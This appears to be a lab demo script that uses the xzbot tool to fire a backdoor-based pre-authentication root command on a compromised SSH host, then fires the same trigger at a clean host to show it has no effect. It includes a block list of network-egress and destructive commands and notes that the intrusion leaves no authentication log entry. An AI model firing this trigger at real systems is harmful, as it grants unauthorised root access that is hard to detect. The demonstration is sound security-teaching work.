#!/usr/bin/env bash
# demo-trigger.sh — RUN ON ANALYST. Fire the backdoor on the compromised host
# with OUR key, then fire the SAME trigger at the normal host to show it does
# nothing. Proves: pre-auth root RCE on compromised, inert on normal.
#
# Usage: ~/demo/demo-trigger.sh ["command"]
#        default command is benign: writes id+uname to /tmp/pwned
set -euo pipefail
# shellcheck source=/dev/null
source "$(dirname "$0")/lab.env"

CMD="${1:-id > /tmp/pwned; uname -a >> /tmp/pwned}"

# Benign-only policy: no network egress / no destructive ops.
case "$CMD" in
  *curl*|*wget*|*nc\ *|*ncat*|*/dev/tcp*|*ssh\ *|*rm\ -rf*|*mkfs*|*dd\ if=*|*shutdown*|*reboot*)
    echo "Refusing command with a network-egress/destructive token: $CMD" >&2; exit 1 ;;
esac

fire() { # ip
  local ip="$1"
  echo ">> xzbot -addr ${ip}:22 -seed <ours> -cmd '${CMD}'"
  "$XZBOT" -addr "${ip}:22" -seed "$SEED" -cmd "$CMD" 2>&1 | tail -1 || true
}

echo "================ COMPROMISED (${COMPROMISED_IP}) ================"
# clear any prior marker
ssh -o BatchMode=yes "root@${COMPROMISED_IP}" 'rm -f /tmp/pwned' 2>/dev/null || true
fire "$COMPROMISED_IP"
sleep 1
echo "--- /tmp/pwned on compromised (proof of pre-auth root RCE): ---"
ssh -o BatchMode=yes "root@${COMPROMISED_IP}" 'cat /tmp/pwned 2>/dev/null' \
  && echo "*** backdoor fired ***" || echo "  (no marker — see troubleshooting)"

echo
echo "================ NORMAL (${NORMAL_IP}) ================"
ssh -o BatchMode=yes "root@${NORMAL_IP}" 'rm -f /tmp/pwned' 2>/dev/null || true
fire "$NORMAL_IP"
sleep 1
echo "--- /tmp/pwned on normal (should NOT exist — host is not backdoored): ---"
ssh -o BatchMode=yes "root@${NORMAL_IP}" 'cat /tmp/pwned 2>/dev/null' \
  && echo "!! unexpected" || echo "  (absent — normal host is immune, as expected)"

echo
echo "Tip: neither sshd logged a successful auth. Check with:"
echo "  ssh root@${COMPROMISED_IP} 'journalctl -u ssh --no-pager | tail; grep Accepted /var/log/auth.log'"
